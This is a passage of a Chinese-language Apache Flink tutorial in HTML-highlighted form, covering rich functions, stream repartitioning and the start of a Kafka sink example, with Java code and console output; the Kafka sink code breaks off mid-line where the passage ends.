class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;String&gt; tweets = env.readTextFile(<span class="string">&quot;INPUT_FILE&quot;</span>); </span><br><span class="line">DataStream&lt;String&gt; flinkTweets = tweets.filter( tweet -&gt; tweet.contains(<span class="string">&quot;flink&quot;</span>) );</span><br></pre></td></tr></table></figure><h5 id="富函数-Rich-Functions"><a href="#富函数-Rich-Functions" class="headerlink" title="富函数(Rich Functions)"></a>富函数(Rich Functions)</h5><pre><code>“富函数”是DataStream API提供的一个函数类的接口，所有Flink函数类都有其Rich版本。**它与常规函数的不同在于，可以获取运行环境的上下文，并拥有一些生命周期方法，所以可以实现更复杂的功能**。</code></pre><ul><li> RichMapFunction </li><li> RichFlatMapFunction </li><li> RichFilterFunction </li><li> … </li></ul><pre><code>Rich Function有一个**生命周期**的概念。典型的生命周期方法有：</code></pre><ul><li> <code>**open()**</code><strong>方法是rich function的初始化方法，当一个算子例如map或者filter被调用之前</strong><code>**open()**</code><strong>会被调用。</strong> </li><li> <code>**close()**</code><strong>方法是生命周期中的最后一个调用的方法，做一些清理工作。</strong> </li><li> <code>**getRuntimeContext()**</code><strong>方法提供了函数的RuntimeContext的一些信息，例如函数执行的并行度，任务的名字，以及state状态</strong> </li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMapFunction</span> <span class="keyword">extends</span> <span class="title">RichMapFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Tuple2</span>&lt;<span class="title">Integer</span>, <span class="title">String</span>&gt;&gt; </span>&#123; </span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, String&gt; <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(getRuntimeContext().getIndexOfThisSubtask(), value.getId()); </span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;my map open&quot;</span>); <span class="comment">// 以下可以做一些初始化工作，例如建立一个和HDFS的连接 </span></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;my map close&quot;</span>); <span class="comment">// 以下做一些清理工作，例如断开和HDFS的连接 </span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.transform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.RichMapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 12:21 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest5_RichFunction</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;Tuple2&lt;String, Integer&gt;&gt; resultStream = dataStream.map( <span class="keyword">new</span> MyMapper() );</span><br><span class="line"></span><br><span class="line">        resultStream.print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 传统的Function不能获取上下文信息，只能处理当前数据，不能和其他数据交互</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMapper0</span> <span class="keyword">implements</span> <span class="title">MapFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Integer&gt; <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getId(), value.getId().length());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现自定义富函数类（RichMapFunction是一个抽象类）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMapper</span> <span class="keyword">extends</span> <span class="title">RichMapFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Integer&gt; <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//            RichFunction可以获取State状态</span></span><br><span class="line"><span class="comment">//            getRuntimeContext().getState();</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getId(), getRuntimeContext().getIndexOfThisSubtask());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// 初始化工作，一般是定义状态，或者建立数据库连接</span></span><br><span class="line">            System.out.println(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// 一般是关闭连接和清空状态的收尾操作</span></span><br><span class="line">            System.out.println(<span class="string">&quot;close&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下：</p><p>由于设置了执行环境env的并行度为4，所以有4个slot执行自定义的RichFunction，输出4次open和close</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">open</span><br><span class="line">open</span><br><span class="line">open</span><br><span class="line">open</span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> (sensor_1,3)</span></span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> (sensor_6,3)</span></span><br><span class="line">close</span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> (sensor_1,1)</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> (sensor_1,1)</span></span><br><span class="line">close</span><br><span class="line"><span class="meta">3&gt;</span><span class="bash"> (sensor_1,2)</span></span><br><span class="line">close</span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> (sensor_7,0)</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> (sensor_10,0)</span></span><br><span class="line">close</span><br></pre></td></tr></table></figure><h4 id="数据重分区操作"><a href="#数据重分区操作" class="headerlink" title="数据重分区操作"></a>数据重分区操作</h4><p>重分区操作，在DataStream类中可以看到很多<code>Partitioner</code>字眼的类。</p><p><strong>其中</strong><code>**partitionCustom(...)**</code><strong>方法用于自定义重分区</strong>。</p><p>java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.transform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 12:38 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest6_Partition</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置并行度 = 4</span></span><br><span class="line">    env.setParallelism(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从文件读取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SingleOutputStreamOperator多并行度默认就rebalance,轮询方式分配</span></span><br><span class="line">    dataStream.print(<span class="string">&quot;input&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. shuffle (并非批处理中的获取一批后才打乱，这里每次获取到直接打乱且分区)</span></span><br><span class="line">    DataStream&lt;String&gt; shuffleStream = inputStream.shuffle();</span><br><span class="line">    shuffleStream.print(<span class="string">&quot;shuffle&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. keyBy (Hash，然后取模)</span></span><br><span class="line">    dataStream.keyBy(SensorReading::getId).print(<span class="string">&quot;keyBy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. global (直接发送给第一个分区，少数特殊情况才用)</span></span><br><span class="line">    dataStream.global().print(<span class="string">&quot;global&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">input:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">input:3&gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br><span class="line">input:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718207, temperature=36.3&#125;</span><br><span class="line">input:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718209, temperature=32.8&#125;</span><br><span class="line">shuffle:2&gt; sensor_6,1547718201,15.4</span><br><span class="line">shuffle:1&gt; sensor_1,1547718199,35.8</span><br><span class="line">input:4&gt; SensorReading&#123;id=&#x27;sensor_7&#x27;, timestamp=1547718202, temperature=6.7&#125;</span><br><span class="line">input:4&gt; SensorReading&#123;id=&#x27;sensor_10&#x27;, timestamp=1547718205, temperature=38.1&#125;</span><br><span class="line">shuffle:1&gt; sensor_1,1547718207,36.3</span><br><span class="line">shuffle:2&gt; sensor_1,1547718209,32.8</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">keyBy:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br><span class="line">keyBy:3&gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br><span class="line">keyBy:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718207, temperature=36.3&#125;</span><br><span class="line">keyBy:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718209, temperature=32.8&#125;</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718207, temperature=36.3&#125;</span><br><span class="line">shuffle:1&gt; sensor_7,1547718202,6.7</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718209, temperature=32.8&#125;</span><br><span class="line">shuffle:2&gt; sensor_10,1547718205,38.1</span><br><span class="line">input:2&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718212, temperature=37.1&#125;</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_7&#x27;, timestamp=1547718202, temperature=6.7&#125;</span><br><span class="line">keyBy:4&gt; SensorReading&#123;id=&#x27;sensor_7&#x27;, timestamp=1547718202, temperature=6.7&#125;</span><br><span class="line">keyBy:2&gt; SensorReading&#123;id=&#x27;sensor_10&#x27;, timestamp=1547718205, temperature=38.1&#125;</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_10&#x27;, timestamp=1547718205, temperature=38.1&#125;</span><br><span class="line">shuffle:1&gt; sensor_1,1547718212,37.1</span><br><span class="line">keyBy:3&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718212, temperature=37.1&#125;</span><br><span class="line">global:1&gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718212, temperature=37.1&#125;</span><br></pre></td></tr></table></figure><h4 id="Sink"><a href="#Sink" class="headerlink" title="Sink"></a>Sink</h4><blockquote><p><a href="https://blog.csdn.net/lixinkuan328/article/details/104116894">Flink之流处理API之Sink</a></p></blockquote><pre><code>Flink没有类似于spark中foreach方法，让用户进行迭代的操作。虽有对外的输出操作都要利用Sink完成。最后通过类似如下方式完成整个任务最终输出操作。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream.addSink(<span class="keyword">new</span> MySink(xxxx))</span><br></pre></td></tr></table></figure><pre><code>官方提供了一部分的框架的sink。除此以外，需要用户自定义实现sink。</code></pre><p><img src="https://img-blog.csdnimg.cn/20200130221249884.png###id=jEMdn&originHeight=602&originWidth=272&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h5><ol><li><p> pom依赖  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Flink_Tutorial<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">flink.version</span>&gt;</span>1.12.1<span class="tag">&lt;/<span class="name">flink.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scala.binary.version</span>&gt;</span>2.12<span class="tag">&lt;/<span class="name">scala.binary.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-streaming-scala_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-clients_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- kafka --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-kafka_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> 编写java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.sink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.serialization.SimpleStringSchema;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.kafka.FlinkKafkaConsumer;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.kafka.FlinkKafkaProducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 1:11 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkTest1_Kafka</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 创建执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 并行度设置为1</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">        properties.setProperty(<span 